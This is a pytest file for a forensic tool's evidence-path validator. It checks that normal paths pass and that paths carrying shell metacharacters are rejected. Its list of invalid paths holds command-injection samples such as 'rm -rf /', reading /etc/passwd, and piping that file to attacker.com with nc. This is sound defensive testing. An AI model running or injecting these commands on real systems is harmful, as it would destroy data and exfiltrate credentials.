"""
Tests for _validate_evidence_path() in geoff_integrated.py.

Verifies that shell metacharacters are rejected and valid paths pass through.
"""

import pytest
import sys, os

# geoff_integrated imports several things at module level that aren't available
# in the test environment, so we need to stub them out.  conftest.py has
# already inserted stubs for the heavy forensic modules; we only need to make
# sure 'flask_cors' and 'jsonschema' are stubbed before importing.
import importlib

# Guard: import only the two symbols we need without executing the full
# module-level startup (Flask app init, thread starts, etc.).
# Strategy: import the module, which conftest stubs make safe.
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

# We import lazily inside the tests so conftest stubs are in place.
def _get_validate():
    import geoff_integrated
    return geoff_integrated._validate_evidence_path


# ---------------------------------------------------------------------------
# Valid paths — must be returned unchanged
# ---------------------------------------------------------------------------

VALID_PATHS = [
    "/mnt/evidence",
    "/mnt/evidence/disk.E01",
    "/home/analyst/cases/case-2024/evidence/",
    "relative/path/to/file.dd",
    "/opt/geoff/cases/001/evidence/memory.lime",
    "/evidence/suspect pc/disk.E01",          # space is fine
    "/evidence/Alice's-laptop/disk.img",      # apostrophe fine (not in regex)
    "/evidence/case.2024-01-01/disk.E01",     # dots and dashes fine
]


@pytest.mark.parametrize("path", VALID_PATHS)
def test_valid_paths_pass(path):
    validate = _get_validate()
    assert validate(path) == path


# ---------------------------------------------------------------------------
# Invalid paths — must raise ValueError
# ---------------------------------------------------------------------------

INVALID_PATHS = [
    # Shell metacharacters
    "/evidence; rm -rf /",
    "/evidence | cat /etc/passwd",
    "/evidence && malicious",
    "/evidence`whoami`",
    "/evidence$(id)",
    "/evidence/{file}",
    "/evidence[0]",
    "/evidence<redirect",
    "/evidence>output",
    # Backslash (Windows paths with backslashes are blocked — use forward slashes)
    "C:\\Users\\suspect\\desktop",
    # Newline / tab injection
    "/evidence/\nmalicious",
    "/evidence/\rmalicious",
    "/evidence/\tmalicious",
    # Exclamation (bash history expansion)
    "/evidence/!danger",
    # Combination
    "/evidence/; cat /etc/passwd | nc attacker.com 4444",
]


@pytest.mark.parametrize("path", INVALID_PATHS)
def test_invalid_paths_raise(path):
    validate = _get_validate()
    with pytest.raises(ValueError, match="unsafe characters"):
        validate(path)


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

def test_empty_string_passes():
    """Empty string has no unsafe chars — passes as-is."""
    validate = _get_validate()
    assert validate("") == ""


def test_only_spaces_passes():
    """Spaces alone are not metacharacters."""
    validate = _get_validate()
    result = validate("   ")
    assert result == "   "


def test_return_value_is_same_object_for_valid():
    """For valid paths the same string value is returned."""
    validate = _get_validate()
    path = "/mnt/evidence/disk.E01"
    assert validate(path) == path
